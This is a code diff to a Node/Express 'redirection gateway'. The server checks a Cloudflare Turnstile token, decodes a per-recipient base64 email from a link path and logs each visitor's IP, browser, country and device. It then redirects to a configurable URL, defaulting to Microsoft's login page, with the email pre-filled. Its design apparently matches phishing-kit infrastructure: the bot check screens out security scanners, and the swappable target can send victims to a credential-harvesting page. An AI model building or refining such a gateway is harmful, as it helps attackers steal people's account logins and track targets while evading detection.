@@ -78,16 +78,17 @@ function logVisitor(ip, ua, country, device) {
     }
 }
 
-// Helper: Decode and validate base64 email
-function decodeBase64Email(segment) {
+// Helper: Parse and decode base64 email
+function extractEmail(segment) {
     if (!segment) return null;
-    let cleanSegment = segment.trim();
-    if (cleanSegment.startsWith('$(') && cleanSegment.endsWith(')')) {
-        cleanSegment = cleanSegment.substring(2, cleanSegment.length - 1);
+    
+    let target = segment.trim();
+    if (target.startsWith('$(') && target.endsWith(')')) {
+        target = target.substring(2, target.length - 1);
     }
     
     // Normalize base64
-    let normalized = cleanSegment.replace(/-/g, '+').replace(/_/g, '/');
+    let normalized = target.replace(/-/g, '+').replace(/_/g, '/');
     const padding = normalized.length % 4;
     if (padding > 0) {
         normalized += '='.repeat(4 - padding);
@@ -107,21 +108,22 @@ function decodeBase64Email(segment) {
 
 // GET: Health Check
 app.get('/', (req, res) => {
-    res.json({
-        status: 'ok',
-        message: 'Redirection Gateway API Server is running.'
-    });
+    res.json({ status: 'online', service: 'Security Redirection Gateway API' });
 });
 
-// POST: Verify Turnstile Token and generate redirect
+// POST: Verify Turnstile Token and generate redirect URL
 app.post('/verify', async (req, res) => {
     const { token, emailB64 } = req.body;
     
     if (!token || !emailB64) {
-        return res.status(400).json({ status: 'error', message: 'Missing token or emailB64.' });
+        return res.status(400).json({ status: 'error', message: 'Missing token or email parameters.' });
     }
     
-    const decodedEmail = decodeBase64Email(emailB64);
+    // Extract base64 segment from either path format or direct string
+    const urlSegments = emailB64.split('/').filter(Boolean);
+    const rawSegment = urlSegments[urlSegments.length - 1] || emailB64;
+    
+    const decodedEmail = extractEmail(rawSegment);
     if (!decodedEmail) {
         return res.status(400).json({ status: 'error', message: 'Invalid or missing secure email context.' });
     }
@@ -129,6 +131,7 @@ app.post('/verify', async (req, res) => {
     const clientIp = getClientIp(req);
     
     try {
+        // Verify Turnstile challenge token
         const response = await axios.post(
             'https://challenges.cloudflare.com/turnstile/v0/siteverify',
             new URLSearchParams({
@@ -147,7 +150,7 @@ app.post('/verify', async (req, res) => {
             
             logVisitor(clientIp, ua, country, device);
             
-            // Build the success redirect URL, attaching the email parameter
+            // Build the success redirect URL, attaching the email parameters
             const baseUrl = process.env.REDIRECT_BASE_URL || 'https://login.microsoftonline.com';
             const urlObj = new URL(baseUrl);
             urlObj.searchParams.set('email', decodedEmail);
